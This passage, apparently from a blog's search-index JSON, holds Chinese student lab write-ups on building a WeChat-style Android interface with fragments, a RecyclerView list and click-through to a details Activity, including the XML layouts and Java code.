0;}\n\n","tags":["密码学实验代码集合"]},{"title":"移动开发实验1：类微信界面","url":"/2023/10/13/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/","content":"AS类微信界面开发功能要求1.、请根据课程内容设计一个app的门户框架，需要实现3-4个tab切换效果；本功能要求需要的技术为：activity、xml、fragment\n2、在任一tab页中实现列表效果；本功能的实现需要使用 recycleview；\n开发技术开发工具：as \n版本：API 24 Android 7.0\n思路分析类微信界面主要分为上中下三个部分，其中上下为 top.xml和 bottom.xml 为基础信息显示。\n主界面中间部分由4个页面叠加，在进行选择内容时变换界面\n其中我选择在聊天界面实现列表效果，采用 recycleview\n设计过程1. 导入所需图片到drawable目录下\n2. 布局设计 xml文件编写标题栏top.xml图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    android:layout_width=\"match_parent\"    android:layout_height=\"50dp\"    android:background=\"@color/black\"    android:gravity=\"center\"    android:orientation=\"vertical\"&gt;    &lt;TextView        android:id=\"@+id/textView\"        android:layout_width=\"match_parent\"        android:layout_height=\"wrap_content\"        android:layout_weight=\"1\"        android:background=\"@color/black\"        android:gravity=\"center_horizontal\"        android:text=\"微信\"        android:textColor=\"@color/white\"        android:textSize=\"40sp\"&gt;&lt;/TextView&gt;&lt;/LinearLayout&gt;\n\n底部选择栏bottom.xml图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:tools=\"http://schemas.android.com/tools\"    android:layout_width=\"match_parent\"    android:layout_height=\"wrap_content\"    android:baselineAligned=\"false\"    android:orientation=\"horizontal\"&gt;    &lt;!-- 微信--&gt;    &lt;LinearLayout        android:id=\"@+id/id_tab_wx\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_weight=\"1\"        android:gravity=\"center\"        android:orientation=\"vertical\"&gt;        &lt;ImageView            android:id=\"@+id/id_tab_wx_img\"            android:layout_width=\"match_parent\"            android:layout_height=\"50dp\"            android:background=\"@color/black\"            android:src=\"@drawable/wx\"/&gt;        &lt;TextView            android:id=\"@+id/id_tab_wx_txt\"            android:layout_width=\"126dp\"            android:layout_height=\"wrap_content\"            android:background=\"@color/black\"            android:gravity=\"center\"            android:text=\"聊天\"            android:textColor=\"@color/white\"            android:textSize=\"30sp\" /&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/id_tab_friend\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_weight=\"1\"        android:gravity=\"bottom\"        android:orientation=\"vertical\"&gt;        &lt;ImageView            android:id=\"@+id/id_tab_friend_img\"            android:layout_width=\"match_parent\"            android:layout_height=\"50dp\"            android:background=\"@color/black\"            android:src=\"@drawable/txl\" /&gt;        &lt;TextView            android:id=\"@+id/id_tab_friend_txt\"            android:layout_width=\"126dp\"            android:layout_height=\"wrap_content\"            android:gravity=\"center\"            android:textColor=\"@color/white\"            android:background=\"@color/black\"            android:textSize=\"30sp\"            android:text=\"通讯\" /&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/id_tab_address\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_weight=\"1\"        android:gravity=\"bottom\"        android:orientation=\"vertical\"&gt;        &lt;ImageView            android:id=\"@+id/id_tab_address_img\"            android:layout_width=\"match_parent\"            android:layout_height=\"50dp\"            android:background=\"@color/black\"            android:src=\"@drawable/find\" /&gt;        &lt;TextView            android:id=\"@+id/id_tab_address_txt\"            android:layout_width=\"126dp\"            android:layout_height=\"wrap_content\"            android:gravity=\"center\"            android:textColor=\"@color/white\"            android:background=\"@color/black\"            android:textSize=\"30sp\"            android:text=\"发现\" /&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/id_tab_setting\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_weight=\"1\"        android:gravity=\"bottom\"        android:orientation=\"vertical\"&gt;        &lt;ImageView            android:id=\"@+id/id_tab_setting_img\"            android:layout_width=\"match_parent\"            android:layout_height=\"50dp\"            android:background=\"@color/black\"            android:src=\"@drawable/w\" /&gt;        &lt;TextView            android:id=\"@+id/id_tab_setting_txt\"            android:layout_width=\"126dp\"            android:layout_height=\"wrap_content\"            android:gravity=\"center\"            android:textColor=\"@color/white\"            android:background=\"@color/black\"            android:textSize=\"30sp\"            android:text=\"我的\" /&gt;    &lt;/LinearLayout&gt;&lt;/LinearLayout&gt;\n\n4个fragment.xml通过一个xml文件将标题栏部分和底部选择栏部分添加到一个xml文件里面，再两个文件中间添加一个content部件，将四个fragment当做卡片压入中间主体部分。四个fragment的xml文件类似，故只放一个文件的内容。\nfragment_lt.xml第一个聊天界面我设置列表效果，只需要添加一个 recycleview 实现列表效果即可\n图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;FrameLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:tools=\"http://schemas.android.com/tools\"    android:layout_width=\"match_parent\"    android:layout_height=\"match_parent\"    xmlns:app=\"http://schemas.android.com/apk/res-auto\"    tools:context=\".ltFragment\"&gt;    &lt;androidx.recyclerview.widget.RecyclerView        android:id=\"@+id/recyclerview\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        app:layout_constraintBottom_toBottomOf=\"parent\"        app:layout_constraintEnd_toEndOf=\"parent\"        app:layout_constraintStart_toStartOf=\"parent\"        app:layout_constraintTop_toTopOf=\"parent\" /&gt;&lt;/FrameLayout&gt;\n\n其他3个xml页面设置为介绍界面即可，效果和代码如下所示\n图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;FrameLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:tools=\"http://schemas.android.com/tools\"    android:layout_width=\"match_parent\"    android:layout_height=\"match_parent\"    tools:context=\".ltFragment\"&gt;    &lt;!-- TODO: Update blank fragment layout --&gt;    &lt;TextView        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:gravity=\"center\"        android:textSize=\"35sp\"        android:text=\"这是聊天界面\" /&gt;&lt;/FrameLayout&gt;\n\n上文已经在相应的 fragment_lt.xml 文件里面添加了 recycleview，此时再添加一个item.xml页面用于页面显示，只包含一个textview\nitem.xml图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    android:layout_width=\"match_parent\"    android:layout_height=\"wrap_content\"&gt;    &lt;TextView        android:id=\"@+id/itemview\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_weight=\"1\"        android:gravity=\"center\"        android:text=\"TextView\"        android:textColor=\"@android:color/black\"        android:textSize=\"40sp\" /&gt;&lt;/LinearLayout&gt;\n\n\n\nmain.xml图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:tools=\"http://schemas.android.com/tools\"    xmlns:app=\"http://schemas.android.com/apk/res-auto\"    android:layout_width=\"match_parent\"    android:layout_height=\"match_parent\"    android:orientation=\"vertical\"    tools:context=\".MainActivity\"&gt;    &lt;include layout=\"@layout/top\" &gt;&lt;/include&gt;    &lt;FrameLayout        android:id=\"@+id/content\"        android:layout_width=\"wrap_content\"        android:layout_height=\"0dp\"        android:layout_gravity=\"center\"        android:layout_weight=\"1\"&gt;    &lt;/FrameLayout&gt;    &lt;include layout=\"@layout/bottom\"&gt;&lt;/include&gt;&lt;/LinearLayout&gt;\n\n3. Java文件代码编写首先依次创建4个fragement\n\n会在相应的layout文件夹下生成4个.xml文件\n\n目前的界面只是一个比较简单的界面，需要完成的功能仅有展示和通过点击部件更换中间部分展示的界面，所以要考虑的代码部分分别为以下四个内容：\n\n\n点击监听部分onclick\n\n\n\n\n将4个fragment压入content里面的代码部分\n\n\n\n\n将四个卡片隐藏起来的代码部分\n\n\n\n\n当点击时展示的界面代码部分\n\n\n创建4个Frangment变量、1个管理对象FragmentManager变量 、4个LinearLayout变量对象\nFragment fragment1,fragment2,fragment3,fragment4;    FragmentManager fm;    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;\n\n新建一个inital函数用以给Fragment页面初始化，在此函数中，将此前定义个4个Fragment变量使用fragmentManager添加到main文件中的中间主体部分的布局中\npublic void inital() {    FragmentTransaction ft = fm.beginTransaction()            .add(R.id.content,fragment1)            .add(R.id.content,fragment2)            .add(R.id.content,fragment3)            .add(R.id.content,fragment4);    ft.commit();}\n\n在点击四个部件时需要展示其所代表的界面，故编写新的一个函数showfragment，展示fragment界面\nprivate void fragmentshow(Fragment fragment) {       FragmentTransaction transaction = fm.beginTransaction()               .show(fragment);       transaction.commit();   }\n\n而在切换界面时，需要对原先的界面进行隐藏之后再展示所需界面，故编写一个新的函数fragmentHide，将所有的fragment界面都隐藏\nprivate void fragmenthide() {        FragmentTransaction ft = fm.beginTransaction()                .hide(fragment1)                .hide(fragment2)                .hide(fragment3)                .hide(fragment4);        ft.commit();    }\n\n仅对底部选择栏的四个控件进行监听，并根据监听所得到的结果调用fragment界面\nlinearLayout1.setOnClickListener(this);   linearLayout2.setOnClickListener(this);   linearLayout3.setOnClickListener(this);   linearLayout4.setOnClickListener(this);\n\n注意这里设置了全局监听\n因此要修改和覆写onClick函数\n修改此处\n\n覆写onClick函数\n@Override    public void onClick(View view) {        fragmenthide();        if (view.getId()==R.id.id_tab_wx){            fragmentshow(fragment1);        }else if (view.getId()==R.id.id_tab_friend){            fragmentshow(fragment2);        }else if (view.getId()==R.id.id_tab_address){            fragmentshow(fragment3);        }else if(view.getId()==R.id.id_tab_setting){            fragmentshow(fragment4);        }    }\n\n而在最开始的界面自然就是聊天界面，故在最开始的时候就调用聊天的fragment\nfragmentshow(fragment1);\n\n\n由于点击聊天要实现列表功能，固还需要在 ltfragment 里面实现 recycleview 功能\n我们先初始化定义一些变量recyclerView，list，context， myadapter（一个适配器）\nprivate RecyclerView recyclerView;private List&lt;String&gt; list;private Context context;private Myadapter myadapter;\n\n然后我们开始在onCreateView（）函数底下写入适配器需要的一些参数和数据：\n@Overridepublic View onCreateView(LayoutInflater inflater, ViewGroup container,                         Bundle savedInstanceState) {    View view=inflater.inflate(R.layout.fragment_lt,container,false);    context=view.getContext();    recyclerView=view.findViewById(R.id.recyclerview);    list=new ArrayList();    initData();//初始化数据    LinearLayoutManager manager=new LinearLayoutManager(context);    manager.setOrientation(LinearLayoutManager.VERTICAL);    myadapter = new Myadapter(context,list);    recyclerView.setAdapter(myadapter);    recyclerView.setLayoutManager(manager);    recyclerView.addItemDecoration(new DividerItemDecoration(context,LinearLayoutManager.VERTICAL));    return view;    // Inflate the layout for this fragment    //return inflater.inflate(R.layout.fragment_lt, container, false);}\n\n分析代码\n初始化列表内容\nprivate void initData(){        list.add(\"网友1:青青园中葵\");        list.add(\"网友2:朝露待日晞\");        list.add(\"网友3:阳春布德泽\");        list.add(\"网友4:万物生光辉\");        list.add(\"网友5:常恐秋节至\");        list.add(\"网友6:焜黄华叶衰\");        list.add(\"网友7:百川东到海\");        list.add(\"网友8:何时复西归\");        list.add(\"网友9:少壮不努力\");        list.add(\"网友10:老大徒伤悲\");    }\n\n创建一个LinearLayoutManager对象，并将其赋值给manager变量。然后通过调用setOrientation(LinearLayoutManager.VERTICAL)方法，将布局方向设置为垂直方向。\nLinearLayoutManager manager=new LinearLayoutManager(context);    manager.setOrientation(LinearLayoutManager.VERTICAL);\n\nmyadapter = new Myadapter(context, list); 创建一个名为myadapter的自定义适配器对象，并传入context和list作为参数进行初始化。\nrecyclerView.setAdapter(myadapter); 将创建的适配器对象myadapter设置给recyclerView，用于显示数据。recyclerView.setLayoutManager(manager); 将之前创建的布局管理器manager设置给recyclerView，用于控制列表的布局方式。\nreturn view; 返回包含recyclerView的视图对象。\nmyadapter = new Myadapter(context,list);    recyclerView.setAdapter(myadapter);    recyclerView.setLayoutManager(manager);    recyclerView.addItemDecoration(new DividerItemDecoration(context,LinearLayoutManager.VERTICAL));    return view;\n\nltfragment全部代码展示package com.example.mywork;import android.content.Context;import android.os.Bundle;import androidx.fragment.app.Fragment;import androidx.recyclerview.widget.DividerItemDecoration;import androidx.recyclerview.widget.LinearLayoutManager;import androidx.recyclerview.widget.RecyclerView;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import java.util.ArrayList;import java.util.List;/** * A simple {@link Fragment} subclass. * Use the {@link ltFragment#newInstance} factory method to * create an instance of this fragment. * */public class ltFragment extends Fragment {    // TODO: Rename parameter arguments, choose names that match    // the fragment initialization parameters, e.g. ARG_ITEM_NUMBER    private static final String ARG_PARAM1 = \"param1\";    private static final String ARG_PARAM2 = \"param2\";    // TODO: Rename and change types of parameters    private String mParam1;    private String mParam2;    /**     * Use this factory method to create a new instance of     * this fragment using the provided parameters.     *     * @param param1 Parameter 1.     * @param param2 Parameter 2.     * @return A new instance of fragment ltFragment.     */    // TODO: Rename and change types and number of parameters    public static ltFragment newInstance(String param1, String param2) {        ltFragment fragment = new ltFragment();        Bundle args = new Bundle();        args.putString(ARG_PARAM1, param1);        args.putString(ARG_PARAM2, param2);        fragment.setArguments(args);        return fragment;    }    public ltFragment() {        // Required empty public constructor    }    @Override    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        if (getArguments() != null) {            mParam1 = getArguments().getString(ARG_PARAM1);            mParam2 = getArguments().getString(ARG_PARAM2);        }    }    private RecyclerView recyclerView;    private List&lt;String&gt; list;    private Context context;    private Myadapter myadapter;    @Override    public View onCreateView(LayoutInflater inflater, ViewGroup container,                             Bundle savedInstanceState) {        View view=inflater.inflate(R.layout.fragment_lt,container,false);        context=view.getContext();        recyclerView=view.findViewById(R.id.recyclerview);        list=new ArrayList();        initData();        LinearLayoutManager manager=new LinearLayoutManager(context);        manager.setOrientation(LinearLayoutManager.VERTICAL);        myadapter = new Myadapter(context,list);        recyclerView.setAdapter(myadapter);        recyclerView.setLayoutManager(manager);        recyclerView.addItemDecoration(new DividerItemDecoration(context,LinearLayoutManager.VERTICAL));        return view;        // Inflate the layout for this fragment        //return inflater.inflate(R.layout.fragment_lt, container, false);    }    private void initData(){        list.add(\"网友1:青青园中葵\");        list.add(\"网友2:朝露待日晞\");        list.add(\"网友3:阳春布德泽\");        list.add(\"网友4:万物生光辉\");        list.add(\"网友5:常恐秋节至\");        list.add(\"网友6:焜黄华叶衰\");        list.add(\"网友7:百川东到海\");        list.add(\"网友8:何时复西归\");        list.add(\"网友9:少壮不努力\");        list.add(\"网友10:老大徒伤悲\");    }}\n\n\n\nMainActivity.java全部内容展示package com.example.mywork;import androidx.appcompat.app.AppCompatActivity;import androidx.fragment.app.Fragment;import androidx.fragment.app.FragmentManager;import androidx.fragment.app.FragmentTransaction;import androidx.recyclerview.widget.LinearLayoutManager;import androidx.recyclerview.widget.RecyclerView;import android.content.Context;import android.os.Bundle;import android.view.View;import android.widget.LinearLayout;import java.util.ArrayList;import java.util.List;public class MainActivity extends AppCompatActivity implements View.OnClickListener{    Fragment fragment1,fragment2,fragment3,fragment4;    FragmentManager fm;    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.main);        fragment1 = new ltFragment();        fragment2 = new txlFragment();        fragment3 = new findFragment();        fragment4 = new wdFragment();        fm = getSupportFragmentManager();        linearLayout1 = findViewById(R.id.id_tab_wx);        linearLayout2 = findViewById(R.id.id_tab_friend);        linearLayout3 = findViewById(R.id.id_tab_address);        linearLayout4 = findViewById(R.id.id_tab_setting);        inital();        fragmenthide();        fragmentshow(fragment1);        linearLayout1.setOnClickListener(this);        linearLayout2.setOnClickListener(this);        linearLayout3.setOnClickListener(this);        linearLayout4.setOnClickListener(this);    }    private void fragmenthide() {        FragmentTransaction ft = fm.beginTransaction()                .hide(fragment1)                .hide(fragment2)                .hide(fragment3)                .hide(fragment4);        ft.commit();    }    public void inital() {        FragmentTransaction ft = fm.beginTransaction()                .add(R.id.content,fragment1)                .add(R.id.content,fragment2)                .add(R.id.content,fragment3)                .add(R.id.content,fragment4);        ft.commit();    }    @Override    public void onClick(View view) {        fragmenthide();        if (view.getId()==R.id.id_tab_wx){            fragmentshow(fragment1);        }else if (view.getId()==R.id.id_tab_friend){            fragmentshow(fragment2);        }else if (view.getId()==R.id.id_tab_address){            fragmentshow(fragment3);        }else if(view.getId()==R.id.id_tab_setting){            fragmentshow(fragment4);        }    }    private void fragmentshow(Fragment fragment) {        FragmentTransaction transaction = fm.beginTransaction()                .show(fragment);        transaction.commit();    }}\n\n\n\n结果展示\n\n\n\n代码仓库Kylinxin/MyWork: 类微信界面源代码 (github.com)\n总结这是我第一次利用as进行移动开发实现了一个简单的类微信的界面设计，加强了我对as的fragment、基本layout、recycleview的认知，以及对xml文件进行界面编写部分以及对相关的控件有了更深入的了解，能够设计基础UI界面，实现界面跳转功能以及在fragment里面调用recycleview实现列表功能，给我提供了一定的思路进行功能和界面相互连接的代码的编写。在这次的实验下我也对AS这款软件进行了熟悉，对于其提词器的强大有了很深的印象。\n​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——2023.10.13\n","categories":["实验"],"tags":["移动开发实验"]},{"title":"移动开发实验2：RecycleView和Activity跳转","url":"/2023/11/07/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C2%EF%BC%9ARecycleView/","content":"AS类微信界面开发功能要求1、在任一tab页中实现列表效果；本功能的实现需要使用 recycleview；\n2、将recyclerView的每个item增加点击功能，点击后跳转到一个新的view展示信息\n开发技术开发工具：as \n版本：API 24 Android 7.0\n思路分析本次实验目的是实现在任一tab页将recyclerView的每个item增加点击功能，点击后跳转到一个新的view展示信息，固需要采用到以下两点技术\n\n\n列表的实现需要使用控件recyclerView进行操作，需创建一个单独的放置recyclerview的layout——item.xml文件，另外还需要单独创建每一项的具体内容的layout文件——fragment_txl.xml\nfragment或activity之间的跳转实现采用startActivity()，新版本中如果还需要返回内容可以采用registerForActivityResult()方法，并采用launch()方法进行跳转\n\n\n总体思路为在layout创建item.xml文件放recyclerview控件，fragment_txl.xml放列表每一项的信息。在txlfragment定义初始化信息并将信息写成数组方便传参，配合Myadapter适配器进行使用，跳转的具体方法采用startActivity()进行跳转，在跳转的详情页面txlDetails接受传过来的intent并显示数据，设置返回按钮用于返回。\n设计过程1.  编写layout1.1 在新建的item.xml中添加recycleview效果\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    android:layout_width=\"match_parent\"    android:layout_height=\"match_parent\"    android:orientation=\"vertical\"&gt;    &lt;androidx.recyclerview.widget.RecyclerView        android:id=\"@+id/itemview\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_marginStart=\"8dp\"        android:layout_marginTop=\"8dp\"        android:layout_marginEnd=\"8dp\"        android:layout_marginBottom=\"8dp\" /&gt;&lt;/LinearLayout&gt;\n\n创建了一个RecyclerView，命名为itemview\n1.2 在fragment_txl.xml中实现每一项的信息效果\n\n代码\n&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:app=\"http://schemas.android.com/apk/res-auto\"    xmlns:tools=\"http://schemas.android.com/tools\"    android:layout_width=\"match_parent\"    android:layout_height=\"wrap_content\"&gt;    &lt;LinearLayout        android:id=\"@+id/linearLayout_txl\"        android:layout_width=\"match_parent\"        android:layout_height=\"wrap_content\"        android:layout_marginTop=\"15dp\"&gt;        &lt;ImageView            android:id=\"@+id/image_touxiang\"            android:layout_width=\"60dp\"            android:layout_height=\"68dp\"            android:layout_marginRight=\"20dp\"            android:layout_gravity=\"left|center_vertical\"            tools:srcCompat=\"@tools:sample/avatars\" /&gt;        &lt;TextView            android:id=\"@+id/text_duihuakuang\"            android:layout_width=\"wrap_content\"            android:layout_height=\"match_parent\"            android:gravity=\"left|center_vertical\"            android:text=\"TextView\"            android:textSize=\"24sp\" /&gt;    &lt;/LinearLayout&gt;&lt;/LinearLayout&gt;\n\n用一个Linearlayout包含了一个ImageView和TextView，方便后续点击跳转\n1.3 实现跳转详情页面activity_txl_details.xml的内容效果\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:app=\"http://schemas.android.com/apk/res-auto\"    xmlns:tools=\"http://schemas.android.com/tools\"    android:layout_width=\"match_parent\"    android:layout_height=\"match_parent\"    android:orientation=\"vertical\"    tools:context=\".txlDetails\"&gt;    &lt;TextView        android:id=\"@+id/WeChatname\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_weight=\"1\"        android:text=\"名字\"        android:textStyle=\"bold\"        android:textSize=\"35sp\"        app:layout_constraintBottom_toBottomOf=\"parent\"        app:layout_constraintEnd_toEndOf=\"parent\"        app:layout_constraintHorizontal_bias=\"0.008\"        app:layout_constraintStart_toStartOf=\"parent\"        app:layout_constraintTop_toTopOf=\"parent\"        app:layout_constraintVertical_bias=\"0.275\" /&gt;    &lt;LinearLayout        android:id=\"@+id/linearLayout\"        android:layout_width=\"411dp\"        android:layout_height=\"wrap_content\"        android:orientation=\"horizontal\"&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/linearLayout2\"        android:layout_width=\"411dp\"        android:layout_height=\"wrap_content\"        android:orientation=\"horizontal\"&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/linearLayout3\"        android:layout_width=\"411dp\"        android:layout_height=\"wrap_content\"        android:orientation=\"horizontal\"&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/linearLayout4\"        android:layout_width=\"411dp\"        android:layout_height=\"wrap_content\"        android:orientation=\"horizontal\"&gt;    &lt;/LinearLayout&gt;    &lt;Button        android:id=\"@+id/returnButton\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_marginTop=\"408dp\"        android:text=\"返回\"        android:textSize=\"35sp\"        app:layout_constraintTop_toBottomOf=\"@+id/imageDetail\"        tools:layout_editor_absoluteX=\"146dp\" /&gt;    &lt;TextView        android:id=\"@+id/wxtag\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_marginTop=\"24dp\"        android:layout_weight=\"1\"        android:textStyle=\"bold\"        android:text=\"标签\"        android:textSize=\"35sp\"        app:layout_constraintTop_toBottomOf=\"@+id/region\"        tools:layout_editor_absoluteX=\"5dp\" /&gt;    &lt;TextView        android:id=\"@+id/wxtag2\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_marginStart=\"188dp\"        android:layout_weight=\"1\"        android:textStyle=\"bold\"        android:gravity=\"center\"        android:text=\"未分类\"        android:textSize=\"35sp\"        app:layout_constraintBottom_toBottomOf=\"parent\"        app:layout_constraintEnd_toEndOf=\"parent\"        app:layout_constraintHorizontal_bias=\"0.441\"        app:layout_constraintStart_toEndOf=\"@+id/wxtag\"        app:layout_constraintTop_toTopOf=\"parent\"        app:layout_constraintVertical_bias=\"0.611\" /&gt;    &lt;TextView        android:id=\"@+id/region\"        android:layout_width=\"141dp\"        android:layout_height=\"wrap_content\"        android:layout_marginTop=\"24dp\"        android:layout_weight=\"1\"        android:textStyle=\"bold\"        android:text=\"地区\"        android:textSize=\"35sp\"        app:layout_constraintTop_toBottomOf=\"@+id/phoneNumber\"        tools:layout_editor_absoluteX=\"5dp\" /&gt;    &lt;TextView        android:id=\"@+id/region2\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_weight=\"1\"        android:gravity=\"center\"        android:text=\"未知\"        android:textSize=\"35sp\"        android:textStyle=\"bold\"        app:layout_constraintBottom_toBottomOf=\"parent\"        app:layout_constraintEnd_toEndOf=\"parent\"        app:layout_constraintHorizontal_bias=\"0.773\"        app:layout_constraintStart_toStartOf=\"@+id/region\"        app:layout_constraintTop_toTopOf=\"parent\"        app:layout_constraintVertical_bias=\"0.501\" /&gt;    &lt;ImageView        android:id=\"@+id/imageDetail\"        android:layout_width=\"154dp\"        android:layout_height=\"121dp\"        android:layout_weight=\"1\"        app:layout_constraintBottom_toBottomOf=\"parent\"        app:layout_constraintEnd_toEndOf=\"parent\"        app:layout_constraintHorizontal_bias=\"0.498\"        app:layout_constraintStart_toStartOf=\"parent\"        app:layout_constraintTop_toTopOf=\"parent\"        app:layout_constraintVertical_bias=\"0.042\"        tools:srcCompat=\"@tools:sample/avatars\" /&gt;    &lt;TextView        android:id=\"@+id/phoneNumber\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_marginTop=\"28dp\"        android:layout_weight=\"1\"        android:gravity=\"center\"        android:textStyle=\"bold\"        android:text=\"电话号码\"        android:textSize=\"35sp\"        app:layout_constraintTop_toBottomOf=\"@+id/WeChatname\"        tools:layout_editor_absoluteX=\"0dp\" /&gt;    &lt;TextView        android:id=\"@+id/phone\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_marginStart=\"36dp\"        android:layout_weight=\"1\"        android:text=\"11111111111\"        android:textSize=\"35sp\"        app:layout_constraintBottom_toBottomOf=\"parent\"        app:layout_constraintEnd_toEndOf=\"parent\"        app:layout_constraintHorizontal_bias=\"0.058\"        app:layout_constraintStart_toEndOf=\"@+id/phoneNumber\"        app:layout_constraintTop_toTopOf=\"parent\"        app:layout_constraintVertical_bias=\"0.388\" /&gt;    &lt;TextView        android:id=\"@+id/textDetail\"        android:layout_width=\"wrap_content\"        android:layout_height=\"wrap_content\"        android:layout_marginStart=\"152dp\"        android:layout_weight=\"3\"        android:gravity=\"center\"        android:text=\"微信昵称\"        android:textStyle=\"bold\"        android:textSize=\"35sp\"        app:layout_constraintBottom_toBottomOf=\"parent\"        app:layout_constraintEnd_toEndOf=\"parent\"        app:layout_constraintHorizontal_bias=\"0.0\"        app:layout_constraintStart_toEndOf=\"@+id/WeChatname\"        app:layout_constraintTop_toTopOf=\"parent\"        app:layout_constraintVertical_bias=\"0.275\" /&gt;&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;\n\n设置了一些基础信息\n2. 核心代码实现2.1 在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter代码\npackage com.example.mywork;import android.content.Context;import android.content.Intent;import android.graphics.Color;import android.os.Bundle;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import android.widget.LinearLayout;import androidx.activity.result.ActivityResult;import androidx.activity.result.ActivityResultCallback;import androidx.activity.result.ActivityResultLauncher;import androidx.activity.result.contract.ActivityResultContracts;import androidx.annotation.NonNull;import androidx.fragment.app.Fragment;import androidx.recyclerview.widget.ItemTouchHelper;import androidx.recyclerview.widget.LinearLayoutManager;import androidx.recyclerview.widget.RecyclerView;import java.util.ArrayList;import java.util.Collections;import java.util.HashMap;import java.util.List;import java.util.Map;public class txlFragment extends Fragment {    //获取recyclerView对象并且实例化适配器    private RecyclerView recyclerView;    private MyAdapter myAdapter;    LinearLayout linearLayout;    @Override    public View onCreateView(LayoutInflater inflater, ViewGroup container,                             Bundle savedInstanceState) {        // Inflate the layout for this fragment        //return inflater.inflate(R.layout.fra_lx, container, false);        View view;        //存所有控件的视图        view=inflater.inflate(R.layout.item, container, false);        //调用recycleview控件        recyclerView=view.findViewById(R.id.itemview);        linearLayout=view.findViewById(R.id.linearLayout_txl);        //创建数据        String[] names={\"Pappy\",\"Mommy\",\"Sister\",\"Little Sister\",\"Brother\",\"Little Brother\",\"Roommate\"};        int[] images={R.drawable.baba,R.drawable.mama,R.drawable.jiejie,R.drawable.meimei,R.drawable.gege,                R.drawable.didi,R.drawable.shiyou1};        String[] phones={\"123456789\",\"123456789\",\"123456789\",\"123456789\",\"123456789\",                \"123456789\",\"123456789\"};        String[] regions={\"四川 南充\",\"四川 南充\",\"四川 南充\",\"四川 南充\",\"四川 南充\",\"四川 南充\",\"湖北 武汉\"};        String[] tags={\"家人\",\"家人\",\"家人\",\"家人\",\"家人\",\"家人\",\"同学\"};        List&lt;Map&lt;String,Object&gt;&gt; items=new ArrayList&lt;Map&lt;String,Object&gt;&gt;();        for(int i=0;i&lt;names.length;i++){            Map&lt;String,Object&gt; item=new HashMap&lt;String, Object&gt;();            item.put(\"i_name\",names[i]);            item.put(\"i_image\",images[i]);            item.put(\"i_phone\",phones[i]);            item.put(\"i_region\",regions[i]);            item.put(\"i_tag\",tags[i]);            items.add(item);        }        //创建RecycleView实例和设置Adapter        Context context=getContext();        myAdapter=new MyAdapter(items,context);        LinearLayoutManager manager=new LinearLayoutManager(context);        manager.setOrientation(recyclerView.VERTICAL);        recyclerView.setLayoutManager(manager);        recyclerView.setAdapter(myAdapter);        return view;    }}\n\n2.2 Myadapater 实现跳转操作package com.example.mywork;import android.content.Context;import android.content.Intent;import android.os.Bundle;import android.util.Log;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import android.widget.ImageView;import android.widget.LinearLayout;import android.widget.TextView;import 